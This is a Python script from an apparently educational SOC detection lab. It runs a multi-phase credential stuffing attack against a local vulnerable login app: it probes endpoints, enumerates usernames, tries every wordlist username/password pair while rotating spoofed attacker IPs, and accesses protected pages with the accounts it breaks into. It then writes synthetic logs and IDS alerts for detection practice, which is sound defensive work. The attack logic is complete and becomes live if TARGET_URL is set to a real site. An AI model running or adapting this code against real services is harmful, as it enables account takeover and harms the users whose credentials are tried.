#!/usr/bin/env python3
"""
Scenario 14: Credential Stuffing Attack Simulation.

Simulates a credential stuffing attack against the vulnerable login app,
testing multiple username/password combinations from wordlists and
generating realistic attack traffic and logs for SOC detection.
"""

import json
import os
import sys
import time

import requests
from colorama import Fore, Style, init

# Add project root to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "..", ".."))

from wcace_lib.log_generator import LogGenerator
from wcace_lib.siem_client import SIEMClient
from wcace_lib.constants import ATTACKER_IP, ATTACKER_IPS, WEB_SERVER_IP

init(autoreset=True)

TARGET_URL = os.environ.get("TARGET_URL", "http://localhost:5000")
LOG_DIR = os.path.join(os.path.dirname(__file__), "..", "logs", "sample_logs")
WORDLIST_DIR = os.path.join(os.path.dirname(__file__), "wordlists")


def banner():
    print(f"""
{Fore.RED}╔══════════════════════════════════════════════════════════╗
║  WCACE Scenario 14: Credential Stuffing Simulation      ║
║  Target: {TARGET_URL:<47s} ║
║  WARNING: Educational use only                           ║
╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}
""")


def load_wordlist(filename: str) -> list[str]:
    """Load a wordlist file and return list of entries."""
    filepath = os.path.join(WORDLIST_DIR, filename)
    if not os.path.exists(filepath):
        print(f"{Fore.RED}[!] Wordlist not found: {filepath}{Style.RESET_ALL}")
        return []
    with open(filepath) as f:
        return [line.strip() for line in f if line.strip() and not line.startswith("#")]


def phase_1_reconnaissance(session: requests.Session, log_gen: LogGenerator) -> list[str]:
    """Phase 1: Probe target to identify login endpoint."""
    print(f"{Fore.YELLOW}[Phase 1] Reconnaissance - Identifying login endpoint{Style.RESET_ALL}")
    logs = []

    endpoints = ["/", "/login", "/status", "/users"]
    for ep in endpoints:
        try:
            resp = session.get(f"{TARGET_URL}{ep}", timeout=5)
            print(f"  [+] {ep} -> {resp.status_code}")
            logs.append(log_gen.web_access_log(ATTACKER_IP, "GET", ep, resp.status_code))
        except requests.exceptions.RequestException as e:
            print(f"  [-] {ep} -> ERROR: {e}")
            logs.append(log_gen.web_access_log(ATTACKER_IP, "GET", ep, 0))
        log_gen.advance_time(1)

    return logs


def phase_2_username_enumeration(
    session: requests.Session, log_gen: LogGenerator, usernames: list[str]
) -> list[str]:
    """Phase 2: Test which usernames exist via login response timing/messages."""
    print(f"\n{Fore.YELLOW}[Phase 2] Username Enumeration - Testing {len(usernames)} usernames{Style.RESET_ALL}")
    logs = []
    valid_users = []

    for username in usernames:
        try:
            resp = session.post(
                f"{TARGET_URL}/login",
                data={"username": username, "password": "test_enum_probe"},
                timeout=5,
            )
            # In a real app, response differences might reveal valid usernames
            print(f"  [*] Testing: {username:<20s} -> {resp.status_code}")
            logs.append(log_gen.web_access_log(
                ATTACKER_IP, "POST", "/login", resp.status_code,
                user_agent="python-requests/2.31.0"
            ))
            log_gen.advance_time(1)
        except requests.exceptions.RequestException:
            logs.append(log_gen.web_access_log(ATTACKER_IP, "POST", "/login", 0))

    # Generate IDS alert for enumeration activity
    logs.append(log_gen.ids_alert(
        ATTACKER_IP, WEB_SERVER_IP,
        "Credential Stuffing: Username enumeration detected",
        sid=9200001, severity=2
    ))

    return logs


def phase_3_credential_stuffing(
    session: requests.Session,
    log_gen: LogGenerator,
    usernames: list[str],
    passwords: list[str],
) -> tuple[list[str], list[dict]]:
    """Phase 3: Main credential stuffing attack - test all combos."""
    total_combos = len(usernames) * len(passwords)
    print(f"\n{Fore.YELLOW}[Phase 3] Credential Stuffing - {total_combos} combinations{Style.RESET_ALL}")
    print(f"  Usernames: {len(usernames)} | Passwords: {len(passwords)}")
    logs = []
    compromised = []
    attempt_count = 0
    failed_count = 0

    # Rotate through attacker IPs to simulate distributed attack
    attacker_idx = 0

    for username in usernames:
        for password in passwords:
            attempt_count += 1
            src_ip = ATTACKER_IPS[attacker_idx % len(ATTACKER_IPS)]

            try:
                resp = session.post(
                    f"{TARGET_URL}/login",
                    data={"username": username, "password": password},
                    timeout=5,
                )
                data = resp.json()

                if data.get("status") == "success":
                    print(f"  {Fore.RED}[!] COMPROMISED: {username}:{password} "
                          f"(from {src_ip}){Style.RESET_ALL}")
                    compromised.append({
                        "username": username,
                        "password": password,
                        "src_ip": src_ip,
                        "role": data.get("role", "unknown"),
                    })
                    logs.append(log_gen.web_access_log(
                        src_ip, "POST", "/login", 200,
                        user_agent="python-requests/2.31.0"
                    ))
                    logs.append(log_gen.auth_success(username, src_ip))
                else:
                    failed_count += 1
                    logs.append(log_gen.web_access_log(
                        src_ip, "POST", "/login", 401,
                        user_agent="python-requests/2.31.0"
                    ))
                    logs.append(log_gen.auth_failure(username, src_ip))

                    # Print progress every 50 attempts
                    if attempt_count % 50 == 0:
                        print(f"  [*] Progress: {attempt_count}/{total_combos} "
                              f"({failed_count} failed, {len(compromised)} compromised)")

            except requests.exceptions.RequestException:
                failed_count += 1
                logs.append(log_gen.web_access_log(src_ip, "POST", "/login", 0))
                logs.append(log_gen.auth_failure(username, src_ip))

            log_gen.advance_time(1)

            # Rotate attacker IP every few attempts
            if attempt_count % 5 == 0:
                attacker_idx += 1

    # Generate IDS alerts for the credential stuffing activity
    logs.append(log_gen.ids_alert(
        ATTACKER_IP, WEB_SERVER_IP,
        f"Credential Stuffing: {attempt_count} login attempts detected",
        sid=9200002, severity=1
    ))
    if compromised:
        logs.append(log_gen.ids_alert(
            ATTACKER_IP, WEB_SERVER_IP,
            f"Credential Stuffing: {len(compromised)} accounts compromised",
            sid=9200003, severity=1
        ))

    print(f"\n  {Fore.CYAN}[*] Stuffing complete: {attempt_count} attempts, "
          f"{failed_count} failed, {len(compromised)} compromised{Style.RESET_ALL}")

    return logs, compromised


def phase_4_post_compromise(
    session: requests.Session,
    log_gen: LogGenerator,
    compromised: list[dict],
) -> list[str]:
    """Phase 4: Post-compromise - access resources with stolen credentials."""
    print(f"\n{Fore.YELLOW}[Phase 4] Post-Compromise - Accessing resources with stolen credentials{Style.RESET_ALL}")
    logs = []

    if not compromised:
        print(f"  [-] No accounts compromised - skipping post-compromise phase")
        return logs

    for account in compromised:
        username = account["username"]
        src_ip = account["src_ip"]
        role = account["role"]
        print(f"  [+] Logging in as {username} (role: {role}) from {src_ip}")

        try:
            # Successful login with compromised credentials
            resp = session.post(
                f"{TARGET_URL}/login",
                data={"username": username, "password": account["password"]},
                timeout=5,
            )
            logs.append(log_gen.web_access_log(
                src_ip, "POST", "/login", resp.status_code,
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
            ))
            logs.append(log_gen.auth_success(username, src_ip))

            # Access protected resources
            for endpoint in ["/status", "/users"]:
                resp = session.get(f"{TARGET_URL}{endpoint}", timeout=5)
                print(f"    -> {endpoint} ({resp.status_code})")
                logs.append(log_gen.web_access_log(
                    src_ip, "GET", endpoint, resp.status_code,
                    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
                ))

        except requests.exceptions.RequestException:
            pass

        log_gen.advance_time(5)

    return logs


def main():
    banner()

    # Load wordlists
    usernames = load_wordlist("common_usernames.txt")
    passwords = load_wordlist("common_passwords.txt")

    if not usernames or not passwords:
        print(f"{Fore.RED}[!] Failed to load wordlists. Check attack/wordlists/ directory.{Style.RESET_ALL}")
        sys.exit(1)

    print(f"[*] Loaded {len(usernames)} usernames and {len(passwords)} passwords")

    # Check if target is reachable
    session = requests.Session()
    target_live = False
    try:
        resp = session.get(TARGET_URL, timeout=5)
        print(f"{Fore.GREEN}[*] Target reachable: {TARGET_URL}{Style.RESET_ALL}\n")
        target_live = True
    except requests.exceptions.RequestException:
        print(f"{Fore.RED}[!] Target unreachable. Start the vuln app first:")
        print(f"    python3 attack/vuln_app.py{Style.RESET_ALL}")
        print(f"\n[*] Generating sample logs in offline mode...\n")

    log_gen = LogGenerator(source_host="attacker-kali")
    all_logs = []

    # Execute attack phases
    all_logs.extend(phase_1_reconnaissance(session, log_gen))
    all_logs.extend(phase_2_username_enumeration(session, log_gen, usernames))
    stuffing_logs, compromised = phase_3_credential_stuffing(
        session, log_gen, usernames, passwords
    )
    all_logs.extend(stuffing_logs)
    all_logs.extend(phase_4_post_compromise(session, log_gen, compromised))

    # Save logs
    os.makedirs(LOG_DIR, exist_ok=True)
    log_file = os.path.join(LOG_DIR, "credential_stuffing_attack.jsonl")
    SIEMClient.write_logs_to_file(all_logs, log_file)

    # Save compromised accounts report
    if compromised:
        report_file = os.path.join(LOG_DIR, "compromised_accounts.json")
        with open(report_file, "w") as f:
            json.dump({
                "scenario": "14-credential-stuffing",
                "total_attempts": len(usernames) * len(passwords),
                "compromised_count": len(compromised),
                "accounts": compromised,
            }, f, indent=2)
        print(f"\n{Fore.RED}[!] Compromised accounts saved to {report_file}{Style.RESET_ALL}")

    print(f"\n{Fore.GREEN}[*] Attack simulation complete")
    print(f"[*] {len(all_logs)} log entries written to {log_file}{Style.RESET_ALL}")

    # Try to send to Loki if available
    try:
        siem = SIEMClient()
        siem.loki_push_lines(
            {"job": "attack_sim", "scenario": "14-credential-stuffing"},
            all_logs
        )
        print(f"[*] Logs pushed to Loki")
    except Exception:
        print(f"[*] Loki not available - logs saved locally only")


if __name__ == "__main__":
    main()
